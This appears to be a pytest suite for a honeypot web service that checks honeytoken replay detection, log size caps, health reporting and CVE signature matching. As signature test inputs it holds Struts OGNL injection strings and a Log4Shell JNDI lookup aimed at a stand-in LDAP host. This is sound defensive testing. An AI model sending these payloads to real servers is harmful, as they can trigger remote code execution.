"""Verification for the pre-release fixes. Run inside the app/ dir."""
import json, os, time, pathlib
import pytest
from fastapi.testclient import TestClient

LOGDIR = pathlib.Path(os.environ["HB_LOG_DIR"])


@pytest.fixture(autouse=True)
def _isolate():
    """Each test starts with an empty rate-limit bucket and token memory.

    Without this the suite tests the rate limiter rather than what it means to,
    and every later assertion sees 429s.
    """
    import main
    main._rate_buckets.clear()
    main._issued_token_ids.clear()
    main._issued_token_order.clear()
    main._issued_token_prefixes.clear()
    yield
    main._rate_buckets.clear()


def events():
    p = LOGDIR / "http_events.jsonl"
    if not p.exists():
        return []
    return [json.loads(l) for l in p.read_text().splitlines() if l.strip()]


def test_honeytoken_reuse_still_detected():
    """The scan was inverted for performance; detection must be unchanged."""
    import main
    c = TestClient(main.app)
    c.get("/.env")
    issued = [e for e in events() if e.get("event") == "honeytoken_issued"]
    assert issued, "no honeytokens were minted by GET /.env"
    tok = issued[0]["token"]

    # replay in each of the four inspected locations
    for where, call in [
        ("query", lambda: c.get(f"/anything?k={tok}")),
        ("body", lambda: c.post("/api/run-job", content=f"payload={tok}")),
        ("headers", lambda: c.get("/anything", headers={"x-probe": tok})),
    ]:
        before = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
        call()
        after = [e for e in events() if e.get("event") == "honeytoken_reuse_observed"]
        assert len(after) > before, f"reuse NOT detected in {where}"
        assert after[-1]["token"] == tok
        print(f"  reuse detected in {where}: seen_in={after[-1]['seen_in']}")


def test_uppercase_and_padded_token_detected():
    """Served values uppercase the id (AKIA...) and repeat it to pad width."""
    import main
    c = TestClient(main.app)
    c.get("/.aws/credentials")
    issued = [e for e in events() if e.get("event") == "honeytoken_issued"]
    tok = issued[-1]["token"]
    before = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
    c.get("/x", headers={"authorization-probe": "AKIA" + (tok * 2).upper()})
    after = [e for e in events() if e.get("event") == "honeytoken_reuse_observed"]
    assert len(after) > before, "padded/uppercase form not detected"
    print(f"  padded+uppercase detected: {after[-1]['token'] == tok}")


def test_unissued_token_not_flagged():
    import main
    c = TestClient(main.app)
    before = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
    c.get("/anything?k=deadbeefdeadbeef")  # 16 hex chars, never issued
    after = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
    assert after == before, "false positive on an unissued 16-hex string"
    print("  no false positive on unissued hex")


def test_scan_cost_is_independent_of_issued_count():
    """The whole point of the inversion: 50k issued tokens must not slow a request."""
    import main
    c = TestClient(main.app)
    body = "A" * 60_000

    main._issued_token_ids.clear(); main._issued_token_order.clear()
    t0 = time.perf_counter()
    for _ in range(20):
        c.post("/api/run-job", content=body)
    empty = time.perf_counter() - t0

    for i in range(50_000):
        main._remember_issued_token(f"{i:016x}")
    t0 = time.perf_counter()
    for _ in range(20):
        c.post("/api/run-job", content=body)
    full = time.perf_counter() - t0

    ratio = full / empty if empty else 0
    print(f"  20 reqs w/ 64KB body: empty-set {empty:.3f}s, 50k-token set {full:.3f}s (x{ratio:.2f})")
    assert ratio < 3.0, f"scan still scales with issued-token count (x{ratio:.1f})"


def test_header_value_is_capped_in_log():
    import main
    c = TestClient(main.app)
    c.get("/anything", headers={"x-big": "z" * 200_000})
    rec = [e for e in events() if e.get("event") == "request"][-1]
    line = json.dumps(rec)
    assert len(line) < 60_000, f"one request wrote {len(line)} bytes to the log"
    assert "<truncated:len=200000>" in line
    print(f"  200KB header -> {len(line)} byte log line")


def test_healthz_reports_write_failure():
    import main
    c = TestClient(main.app)
    assert c.get("/healthz").status_code == 200
    main.writer.last_write_error = "OSError: [Errno 28] No space left on device"
    main.writer.write_failures = 3
    r = c.get("/healthz")
    assert r.status_code == 503 and r.json() == {"ok": False}
    assert "free" not in r.text and "space" not in r.text, "healthz leaked operator detail"
    main.writer.last_write_error = None
    assert c.get("/healthz").status_code == 200
    print("  healthz 503s on write failure, body stays {'ok': false}")


def test_client_disconnect_still_logs_request():
    """A body read that dies mid-stream must not lose the request record."""
    import main, asyncio
    from starlette.requests import ClientDisconnect

    class FakeReq:
        async def stream(self):
            yield b"partial-payload"
            raise ClientDisconnect()

    body, exceeded = asyncio.get_event_loop().run_until_complete(
        main._read_capped_body(FakeReq()))
    assert body == b"partial-payload" and exceeded is False
    print("  mid-body disconnect returns partial body instead of raising")


def test_db_password_reuse_now_detected():
    """12-char prefix honeytokens (~14% of issuances) were undetectable."""
    import main
    c = TestClient(main.app)
    c.get("/.env")
    issued = [e for e in events() if e.get("event") == "honeytoken_issued"]
    dbp = [e for e in issued if e.get("kind") == "db_password"]
    assert dbp, f"no db_password issued; kinds seen: {set(e.get('kind') for e in issued)}"
    tok = dbp[-1]["token"]
    served = tok[:12]
    assert len(served) == 12
    before = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
    c.get(f"/anything?db={served}")
    after = [e for e in events() if e.get("event") == "honeytoken_reuse_observed"]
    assert len(after) > before, "12-char db_password replay STILL not detected"
    assert after[-1]["token"] == tok and after[-1]["matched"] == "prefix"
    print(f"  db_password 12-char replay detected -> full id {tok}")


def test_struts_s2_057_signatures_fire():
    import main
    for payload in ["redirect:${233*233}", "redirectAction:${233*233}",
                    "${@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}"]:
        hit = any(cve == "CVE-2018-11776" and pat.search(payload)
                  for cve, pat, _ in main.CVE_SIGNATURES)
        assert hit, f"S2-057 pattern still misses: {payload}"
    print("  CVE-2018-11776 matches all 3 real-world payload shapes")


def test_duplicate_header_payload_is_scanned():
    import main, asyncio
    raw = [["referer", "harmless"], ["referer", "${jndi:ldap://x/a}"]]
    text = main._headers_haystack(raw)
    hit = any(cve == "CVE-2021-44228" and pat.search(text)
              for cve, pat, _ in main.CVE_SIGNATURES)
    assert hit, "payload in a duplicate header's 2nd occurrence still missed"
    print("  Log4Shell in duplicate header now scanned")


def test_internal_healthcheck_not_logged():
    import main
    c = TestClient(main.app)
    before = len([e for e in events() if e.get("event") == "request"])
    c.get("/healthz")                                        # loopback, no XFF
    mid = len([e for e in events() if e.get("event") == "request"])
    assert mid == before, "internal healthcheck polluted the dataset"
    c.get("/healthz", headers={"x-forwarded-for": "203.0.113.5"})   # via Caddy
    after = len([e for e in events() if e.get("event") == "request"])
    assert after == mid + 1, "external /healthz probe was wrongly dropped"
    print("  internal healthcheck skipped, external probe still logged")
